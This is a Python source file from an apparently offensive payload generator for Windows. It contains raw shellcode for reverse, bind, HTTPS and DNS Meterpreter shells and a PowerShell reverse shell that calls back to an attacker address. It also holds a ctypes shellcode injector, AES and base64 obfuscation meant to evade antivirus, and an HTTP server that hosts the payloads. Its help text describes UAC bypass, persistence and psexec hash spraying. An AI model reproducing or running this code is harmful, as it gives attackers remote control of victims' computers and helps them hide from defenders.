# -*- coding: utf-8 -*-
import os
import socket
import re
import subprocess
import struct
import sys
import blessings
import random
import SimpleHTTPServer
import SocketServer
import multiprocessing
from Crypto.Cipher import AES
import base64
import string
import glob
import readline
import time
import psexec
import urllib2

t = blessings.Terminal()


class SHELLCODE(object):

    windows_rev_shell = (
        "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
        "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
        "\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
        "\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
        "\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
        "\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
        "\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
        "\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
        "\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
        "\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
        "\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
        "\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
        "\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
        "\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f"
        "\xdf\xe0\xff\xd5\x97\x6a\x05\x68%s\x68" #ip
        "\x02\x00%s\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5"
        "\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec"
        "\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89"
        "\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66"
        "\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44"
        "\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68"
        "\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"
        "\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68"
        "\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
        "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5")

    windows_met_rev_shell = (
        "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
        "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
        "\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
        "\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
        "\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
        "\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
        "\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
        "\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
        "\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
        "\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
        "\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
        "\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
        "\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
        "\xff\xd5\x6a\x05\x68%s\x68\x02\x00%s" #ip,port
        "\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea"
        "\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5"
        "\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec"
        "\xe8\x61\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02"
        "\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a"
        "\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53"
        "\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9"
        "\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x22\x58\x68\x00\x40"
        "\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57"
        "\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\xe9"
        "\x71\xff\xff\xff\x01\xc3\x29\xc6\x75\xc7\xc3\xbb\xf0"
        "\xb5\xa2\x56\x6a\x00\x53\xff\xd5")

    windows_met_bind_shell = (
        "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
        "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
        "\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
        "\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
        "\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
        "\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
        "\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
        "\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
        "\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
        "\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
        "\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
        "\x29\x80\x6b\x00\xff\xd5\x6a\x0b\x59\x50\xe2\xfd\x6a\x01\x6a"
        "\x02\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x68\x02\x00%s\x89" #port
        "\xe6\x6a\x10\x56\x57\x68\xc2\xdb\x37\x67\xff\xd5\x85\xc0\x75"
        "\x58\x57\x68\xb7\xe9\x38\xff\xff\xd5\x57\x68\x74\xec\x3b\xe1"
        "\xff\xd5\x57\x97\x68\x75\x6e\x4d\x61\xff\xd5\x6a\x00\x6a\x04"
        "\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x2d\x8b"
        "\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53"
        "\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f"
        "\xff\xd5\x83\xf8\x00\x7e\x07\x01\xc3\x29\xc6\x75\xe9\xc3")

    windows_met_rev_https_shell = (
        "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
        "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
        "\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
        "\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
        "\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
        "\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
        "\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
        "\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
        "\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
        "\x8d\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c"
        "\x77\x26\x07\xff\xd5\x31\xdb\x53\x53\x53\x53\x53\x68\x3a\x56"
        "\x79\xa7\xff\xd5\x53\x53\x6a\x03\x53\x53\x68%s\x00\x00" #port
        "\xe8\x8c\x00\x00\x00\x2f\x53\x32\x49\x34\x5a\x00\x50\x68\x57"
        "\x89\x9f\xc6\xff\xd5\x89\xc6\x53\x68\x00\x32\xe0\x84\x53\x53"
        "\x53\x57\x53\x56\x68\xeb\x55\x2e\x3b\xff\xd5\x96\x6a\x0a\x5f"
        "\x68\x80\x33\x00\x00\x89\xe0\x6a\x04\x50\x6a\x1f\x56\x68\x75"
        "\x46\x9e\x86\xff\xd5\x53\x53\x53\x53\x56\x68\x2d\x06\x18\x7b"
        "\xff\xd5\x85\xc0\x75\x0a\x4f\x75\xd9\x68\xf0\xb5\xa2\x56\xff"
        "\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x53\x68"
        "\x58\xa4\x53\xe5\xff\xd5\x93\x53\x53\x89\xe7\x57\x68\x00\x20"
        "\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xcd"
        "\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\x5f\xe8\x75\xff\xff"
        "\xff%s\x00") #ip

    windows_met_rev_shell_dns = (
        "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
        "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
        "\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
        "\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
        "\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
        "\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
        "\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
        "\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
        "\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
        "\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
        "\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
        "\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
        "\xea\x0f\xdf\xe0\xff\xd5\x97\xe8\x40\x00\x00\x00%s\x00"
        "\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
        "\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
        "\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
        "\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
        "\x00\x68\xa9\x28\x34\x80\xff\xd5\x8b\x40\x1c\x6a\x05\x50\x68"
        "\x02\x00%s\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61"
        "\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2"
        "\x56\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff"
        "\xd5\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58"
        "\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9"
        "\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x75\xee\xc3")

    windows_ps_rev_shell = (
        "$client = New-Object System.Net.Sockets.TCPClient('%s','%s');"
        "$stream = $client.GetStream(); [byte[]]$bytes = 0..65535%s;"
        "$sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>');"
        "$stream.Write($sendbytes,0,$sendbytes.Length); while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)"
        "{$EncodedText = New-Object -TypeName System.Text.ASCIIEncoding; $data = $EncodedText.GetString($bytes,0, $i);"
        "try{$commandback = (Invoke-Expression -Command $data 2>&1 | Out-String )}catch{Write-Warning \"Error on Target\"};"
        "$backres  = $commandback + 'PS ' + (Get-Location).Path + '> ';$x = ($error[0] | Out-String);$error.clear();"
        "$backres = $backres + $x;$sendbyte = ([text.encoding]::ASCII).GetBytes($backres);$stream.Write($sendbyte,0,$sendbyte.Length);"
        "$stream.Flush()};$client.Close();if ($listener){$listener.Stop()}")

    injectwindows = """#/usr/bin/python
import ctypes

shellcode = bytearray('%s')
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),buf,ctypes.c_int(len(shellcode)))
ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(ptr),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
"""

class FUNCTIONS(object):

    def winpayloads_help(self):
        print_payloads =(
"""
+ Windows Reverse Shell
    - This payload will give the attacker a stageless reverse tcp shell
    - A listener will be automatically started using NetCat
    - Shellter is the only avalible module for this payload

+ Windows Reverse Meterpreter
    - This payload will give the attacker a staged reverse tcp meterpreter shell
    - A listener will be automatically started using Metasploit
    - All MODULES are avalible for this payload

+ Windows Bind Meterpreter
    - This payload will give the attacker a staged bind tcp meterpreter shell
    - Connection to the bind port will be automatically started using Metasploit
    - All MODULES are avalible for this payload

+ Windows Reverse Meterpreter HTTPS
    - This payload will give the attacker a staged reverse HTTPS meterpreter shell
    - A listener will be automatically started using Metasploit
    - All MODULES are avalible for this payload

+ Windows Reverse Meterpreter DNS
    - This payload will give the attacker a staged reverse tcp meterpreter shell with DNS name resolution
    - Good for dynamic ip addresses and persistence payloads
    - A listener will be automatically started using Metasploit
    - All MODULES are avalible for this payload
""")
        print_modules =(
"""
+ Shellter
    - Shellter is a dynamic shellcode injection tool, and the first truly dynamic PE infector ever created
    - It can be used in order to inject shellcode into native Windows applications (32-bit only)
    - https://www.shellterproject.com/introducing-shellter/

+ UAC Bypass
    - This Module only works on Local Administrator Accounts
    - Using this module, PowerShellEmpire's UAC Bypass will execute on the target
    - This will bypass uac and create another session running as administrator
    - https://github.com/PowerShellEmpire/Empire

+ Priv Esc checks
    - Using this module, PowerShellEmpire's PowerUp AllChecks will execute on the target
    - This will find common privesc vulnerabilities on the target
    - https://github.com/PowerShellEmpire/Empire

+ Persistence
    - This module will run a powershell script on the target
    - Persistence adds registry keys and to the startup folder to automatically run the payload everytime the target boots
""")
        print_deployment =(
"""
+ SimpleHTTPServer
    - The payload will be hosted locally on a HTTP server

+ Psexec and Spraying
    - Spray hashes to find a vulnerable target
    - Psexec the payload to the target
    - Runs as system
""")
        print "\n|=------=|"
        print "|" + t.bold_green + "PAYLOADS" + t.normal + "|"
        print "|=------=|"
        print print_modules
        print "\n|=-----=|"
        print "|" + t.bold_green + "MODULES" + t.normal + "|"
        print "|=-----=|"
        print print_payloads
        print "\n|=--------=|"
        print "|" + t.bold_green + "DEPLOYMENT" + t.normal + "|"
        print "|=--------=|"
        print print_deployment


    def __init__(self):
        self.BLOCK_SIZE = 32
        self.PADDING = '{'
        self.imports = list()
        self.output = list()

    def randKey(self, bytes):
        return ''.join(random.choice(string.ascii_letters + string.digits + "{}!@#$^&()*&[]|,./?") for x in range(bytes))

    def randVar(self):
        return ''.join(random.choice(string.ascii_letters) for x in range(3)) + "_" + ''.join(random.choice("0123456789") for x in range(3))

    def pad(self, s):
        return str(s) + (self.BLOCK_SIZE - len(str(s)) % self.BLOCK_SIZE) * self.PADDING

    def EncodeAES(self, c, s):
        return base64.b64encode(c.encrypt(self.pad(s)))

    def DecodeAES(self, c, e):
        return c.decrypt(base64.b64decode(e)).rstrip(self.PADDING)

    def DoPyCipher(self, filecontents):  # Adaptation of PyHerion 1.0 By: @harmj0y
        key, iv = self.randKey(32), self.randKey(16)

        input = filecontents.split('\n')

        newoutput = ''

        for line in input:
            if not line.startswith("#"):
                if "import" in line:
                    self.imports.append(line.strip())
                else:
                    self.output.append(line)

        cipherEnc = AES.new(key, AES.MODE_CBC, iv)

        encrypted = self.EncodeAES(cipherEnc, "\n".join(self.output))

        self.imports.append("from base64 import b64decode")
        self.imports.append("from Crypto.Cipher import AES")

        random.shuffle(self.imports)
        randomstring = ''.join(random.choice(string.lowercase) for x in range(500))
        randomimport = ''.join(random.choice(string.lowercase) for x in range(10))
        randombytes = ''
        for i in randomstring:
            randombytes += hex(ord(i))
        newoutput = "%s = \"%s\"\n" % (randomimport,randombytes) + ";".join(self.imports) + "\n"

        newoutput += "exec(b64decode(\"%s\"))" % (base64.b64encode(
            "exec(AES.new(\"%s\", AES.MODE_CBC, \"%s\").decrypt(b64decode(\"%s\")).rstrip('{'))\n" % (key, iv, encrypted)))
        return newoutput

    def ServePayload(self, payloaddirectory):
        try:
            os.chdir(payloaddirectory)
            Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
            httpd = SocketServer.TCPServer(('', 8000), Handler)
            httpd.serve_forever()
        except:
            print t.bold_red + '\n[*] WebServer Shutdown' + t.normal

    def DoServe(self, want_to_payloadinexe, want_to_upload, IP, payloadinexe_payloadnameshort, payloadname, payloaddir):
        if want_to_payloadinexe == 'y' and want_to_upload.lower() == 'y' or want_to_payloadinexe == 'y' and want_to_upload.lower() == '':
            print t.bold_green + "\n[*] Serving Payload On http://%s:8000/%s" % (IP, payloadinexe_payloadnameshort.group(0)) + t.normal
            a = multiprocessing.Process(
                target=self.ServePayload, args=(os.getcwd() + '/compiled',))
            a.daemon = True
            a.start()
        elif want_to_payloadinexe == 'n' and want_to_upload.lower() == 'y' or want_to_payloadinexe == '' and want_to_upload.lower() == '':
            print t.bold_green + "\n[*] Serving Payload On http://%s:8000/%s" % (IP, payloadname) + t.normal
            a = multiprocessing.Process(
                target=self.ServePayload, args=(payloaddir,))
            a.daemon = True
            a.start()


class Spinner(object):

    def __init__(self):
        self.spinner = [
            ["|", "\\", "-", "/"],
            ["▁","▃","▄","▅","▆","▇","█","▇","▆","▅","▄","▃"],
            ["◡◡", "⊙⊙", "◠◠"],
            ["◐","◓","◑","◒"],
            ["▉","▊","▋","▌","▍","▎","▏","▎","▍","▌","▋","▊","▉"],
            [".","o","O","@","*"],
            ["◴","◷","◶","◵"],
            ["▖","▘","▝","▗"],
            ["←","↖","↑","↗","→","↘","↓","↙"],
            ["◢","◣","◤","◥"]
            ]
        self.loading = ['G', 'e', 'n', 'e', 'r', 'a', 't', 'i',
                        'n', 'g', ' ', 'P', 'a', 'y', 'l', 'o', 'a', 'd']
        self.randomchoice = random.choice(self.spinner)
        self.spin_1 = len(self.randomchoice)
        self.spin_2 = len(self.loading) + 1
        self.x = 0

    def Looper(self, text):
        print t.bold_green,
        sys.stdout.write('\r')
        sys.stdout.write(text)
        print t.normal,
        sys.stdout.flush()

    def Update(self):
        self.spin_2mod = self.x % self.spin_2
        self.Looper(self.randomchoice[self.x % self.spin_1] + " " + "".join(
            self.loading[0: (self.spin_2mod)]) + (" " * (self.spin_2 - self.spin_2mod)))
        self.x += 1
